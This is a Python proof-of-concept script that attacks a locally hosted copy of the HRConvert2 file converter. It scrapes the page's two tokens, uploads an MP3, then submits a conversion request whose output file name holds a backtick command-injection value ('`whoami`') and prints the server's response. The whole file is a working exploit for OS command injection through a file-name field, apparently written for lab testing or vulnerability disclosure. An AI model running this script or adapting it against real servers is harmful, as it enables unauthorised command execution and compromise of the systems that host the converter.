#!/usr/bin/env python3
import re
import requests

URL = "http://127.0.0.1:8080/HRProprietary/HRConvert2/convertCore.php"


def get_tokens(session):
    r = session.get(URL, timeout=100)
    r.raise_for_status()
    t1 = re.search(r"name=['\"]Token1['\"]\s+value=['\"]([^'\"]+)['\"]", r.text)
    t2 = re.search(r"name=['\"]Token2['\"]\s+value=['\"]([^'\"]+)['\"]", r.text)
    if not t1 or not t2:
        raise RuntimeError("token parse failed")
    return t1.group(1), t2.group(1)


def upload_file(session, token1, token2):
    with open("sample.mp3", "rb") as f:
        files = {"file": ("sample.mp3", f, "audio/mpeg")}
        data = {"Token1": token1, "Token2": token2}
        r = session.post(URL, data=data, files=files, timeout=100)
    r.raise_for_status()
    return r


def main():
    s = requests.Session()
    s.trust_env = False
    token1, token2 = get_tokens(s)
    up = upload_file(s, token1, token2)

    data = {
        "Token1": token1,
        "Token2": token2,
        "convertSelected": "sample.mp3",
        "extension": "mp3",
        "userconvertfilename": "`whoami`",
    }
    try:
        r = s.post(URL, data=data, timeout=100)
        r.raise_for_status()
    except requests.exceptions.ReadTimeout:
        print("token1:", token1)
        print("token2:", token2)
        print("upload_status:", up.status_code)
        print("convert_status: timeout")
        print("reason: server conversion took longer than 100s")
        return

    print("token1:", token1)
    print("token2:", token2)
    print("upload_status:", up.status_code)
    print("convert_status:", r.status_code)
    print("body_head:", r.text[:300].replace("\n", " "))


if __name__ == "__main__":
    main()
